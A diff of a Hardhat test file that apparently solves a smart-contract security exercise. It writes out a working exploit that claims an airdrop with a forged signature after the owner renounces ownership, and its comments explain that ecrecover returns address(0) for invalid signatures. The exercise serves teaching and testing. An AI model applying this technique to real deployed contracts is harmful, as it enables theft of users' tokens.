@@ -14,11 +14,29 @@ describe("Week22Exercise1", function () {
 
   describe("Exploit", function () {
     it("Exploit worked", async function () {
-      const { week22Exercise3 } = await loadFixture(deployToken);
+      const { week22Exercise3, deployer } = await loadFixture(deployToken);
 
-      expect(await week22Exercise3.something()).to.equal(false);
+      const amount = 1;
+      const to = deployer.address;
+      const v = 5;
+      const r =
+        "0xaef4899e556330b0c4e764d90b7a4c864ef03ba9725aa694ac67783bcf004aa0";
+      const s =
+        "0x0a01b87088c349649c938589f7b9f633f28ada510ee3e57d2d559fb8fc9da10e";
 
-      expect(await week22Exercise3.something()).to.equal(true);
+      await expect(
+        week22Exercise3.claimAirdrop(amount, to, v, r, s)
+      ).to.be.revertedWith("invalid signature");
+
+      await week22Exercise3.connect(deployer).renounceOwnership();
+
+      await week22Exercise3.claimAirdrop(amount, to, v, r, s);
+
+      // The exploit lies in the fact that ecrecover can return address(0)
+      // for an invalid signature. There is no check done for this.
+      // So if the owner ever renounces ownership, owner() will return address(0),
+      // an invalid signature will also return address(0) and the checks inside
+      // claimAirdrop will pass.
     });
   });
 });
